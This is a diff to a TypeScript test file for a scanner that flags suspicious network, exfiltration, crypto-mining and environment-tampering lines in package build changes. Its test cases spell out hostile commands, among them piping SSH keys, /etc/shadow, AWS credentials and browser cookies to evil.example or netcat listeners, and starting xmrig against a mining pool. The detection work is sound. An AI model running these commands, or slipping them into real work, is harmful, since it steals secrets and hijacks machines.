@@ -1,32 +1,44 @@
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { dnsmasqHosts, hostsFileHosts, NETWORK_RULES } from './network.rules';
 import { remoteDataLoader } from './rule';
+import { provideRuleDataStore } from './rule-data-store';
 import { addedOnlyDiff, makeChange, ruleById } from './test-support';
 
 describe('network rules', () => {
+  // Standard Monero addresses are 95 base58 characters starting with 4 (subaddresses with 8).
+  const MONERO_ADDRESS = `4${'B'.repeat(94)}`;
+
   it.each([
     ['URL-001', 'source=("http://192.0.2.1/payload")'],
+    ['URL-001', 'source=("http://[2606:4700::1111]/payload")'],
+    ['URL-001', 'source=("http://2130706433/payload")'],
+    ['URL-001', 'source=("http://0x7f000001/payload")'],
     ['URL-002', 'source=("https://bit.ly/abc123")'],
     ['URL-002', 'source=("https://bit.ly:8080/abc123")'],
     ['URL-003', 'source=("https://myhost.duckdns.org/x")'],
     ['URL-003', 'source=("https://myhost.duckdns.org:8443/x")'],
     ['URL-004', 'source=("https://xn--80ak6aa92e.com/")'],
-    ['CAUR-ONION-URL', 'curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion'],
+    ['CAUR-ONION-URL', 'curl --proxy socks5h://olrh4mibs62l6kkuvvjyc5lrercqg5tz.onion'],
     ['EXFIL-003', 'curl -X POST -d @/etc/shadow https://discord.com/api/webhooks/123/token'],
     ['EXFIL-003', 'curl https://api.telegram.org/bot123:token/sendMessage'],
     ['EXFIL-004', 'tar czf - ~/.ssh | curl -X POST --data-binary @- https://evil.example/up'],
     ['EXFIL-004', 'zip -r - .config | curl --data-binary @- https://transfer.sh/x'],
     ['EXFIL-004', 'tar cf - $(pwd) | nc 10.0.0.1 4444'],
+    ['EXFIL-004', 'cat ~/.ssh/id_rsa | nc 10.0.0.1 4444'],
+    ['EXFIL-004', 'dd if=/etc/shadow | curl --data-binary @- https://evil.example/up'],
     ['EXFIL-004', 'curl --upload-file ~/.ssh/id_rsa https://transfer.sh/'],
     ['EXFIL-004', 'curl -T "$HOME/.aws/credentials" https://evil.example/'],
     ['EXFIL-004', 'wget --post-file=/etc/shadow https://evil.example/'],
     ['EXFIL-004', 'curl -F file=@$HOME/.config/google-chrome/Cookies https://x'],
     ['CRYPTO-001', 'xmrig -o stratum+tcp://pool.example:3333'],
-    ['CRYPTO-002', 'install -Dm755 xmrig "$pkgdir"/usr/bin/xmrig'],
+    ['CRYPTO-001', 'xmrig -o stratum+ssl://pool.example:443'],
+    ['CAUR-MONERO-WALLET', `echo ${MONERO_ADDRESS} | xmrig`],
     ['ENV-001', 'export LD_PRELOAD=/usr/lib/libinject.so'],
     ['ENV-002', 'PATH=/tmp/bin:$PATH'],
     ['ENV-002', 'export PATH=/tmp/bin:$PATH'],
     ['HIDDEN-002', '/tmp/.cache/payload.sh'],
+    ['HIDDEN-002', '/dev/shm/stage.py'],
+    ['HIDDEN-002', '/var/tmp/.sysupdate/run.sh'],
     ['INSTALL-003', 'curl -o /tmp/x https://example.org'],
     ['NET-001', 'source=("http://example.org/tarball")'],
   ])('flags %s for %j', (id, line) => {
@@ -45,8 +57,14 @@ describe('network rules', () => {
     ['curl -T ./pkg.tar.zst https://mirror.example/upload/'],
     ['curl -F "file=@dist/app.zip" https://uploads.github.com/x'],
     ['tar czf sources.tar.gz .'],
+    ['cat PKGBUILD | curl --data-binary @- https://paste.example/api'],
   ])('does not flag EXFIL-004 for %j', (line) => {
     expect(ruleById(NETWORK_RULES, 'EXFIL-004').check(makeChange(addedOnlyDiff([line])))).toBeNull();
+  });
+
+  it('does not flag package-scoped PATH adjustments for ENV-002', () => {
+    const change = makeChange(addedOnlyDiff(['export PATH="$pkgdir/usr/bin:$PATH"']));
+    expect(ruleById(NETWORK_RULES, 'ENV-002').check(change)).toBeNull();
   });
 
   it('does not flag archive-over-ssh examples inside documentation files', () => {
@@ -59,6 +77,11 @@ describe('network rules', () => {
   it('does not flag https sources', () => {
     const change = makeChange(addedOnlyDiff(['source=("https://example.org/tarball.tar.gz")']));
     expect(ruleById(NETWORK_RULES, 'NET-001').check(change)).toBeNull();
+  });
+
+  it('does not flag loopback IP URLs for URL-001', () => {
+    const change = makeChange(addedOnlyDiff(['curl http://127.0.0.1:8080/health']));
+    expect(ruleById(NETWORK_RULES, 'URL-001').check(change)).toBeNull();
   });
 });
 
@@ -136,6 +159,53 @@ describe('network rule data loading', () => {
   it('keeps matching built-in hosts even before the blocklist load', () => {
     const change = makeChange(addedOnlyDiff(['source=("https://bit.ly/abc")']));
     expect(ruleById(NETWORK_RULES, 'URL-002').check(change)).not.toBeNull();
+  });
+
+  it('persists downloaded payloads under the rule cacheKey and serves them when the feed is down', async () => {
+    const saved = new Map<string, string>();
+    provideRuleDataStore({
+      load: async (cacheKey) => saved.get(cacheKey) ?? null,
+      save: async (cacheKey, raw) => {
+        saved.set(cacheKey, raw);
+      },
+    });
+
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(new Response('local=/fresh.host/', { status: 200 }))
+      .mockRejectedValue(new Error('feed unreachable'));
+    vi.stubGlobal('fetch', fetchMock);
+    const loader = remoteDataLoader<string[]>({
+      url: 'https://blocklist.example/list',
+      transform: (raw: string) => [raw],
+      cacheKey: 'test-feed',
+    });
+
+    const fresh = await loader();
+    expect(fresh.downloaded).toBe(true);
+    expect(saved.get('test-feed')).toBe('local=/fresh.host/');
+
+    // A new loader instance starts without memoized data, forcing the network path.
+    const offlineLoader = remoteDataLoader<string[]>({
+      url: 'https://blocklist.example/list',
+      transform: (raw: string) => [raw],
+      cacheKey: 'test-feed',
+    });
+    const fallback = await offlineLoader();
+    expect(fallback).toEqual({ data: ['local=/fresh.host/'], downloaded: false, stale: true });
+
+    provideRuleDataStore(null);
+  });
+
+  it('propagates the failure when no persisted payload exists', async () => {
+    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('feed unreachable')));
+    const loader = remoteDataLoader<string>({
+      url: 'https://blocklist.example/list',
+      transform: (raw: string) => raw,
+      cacheKey: 'missing-feed',
+    });
+
+    await expect(loader()).rejects.toThrow('feed unreachable');
   });
 });
 
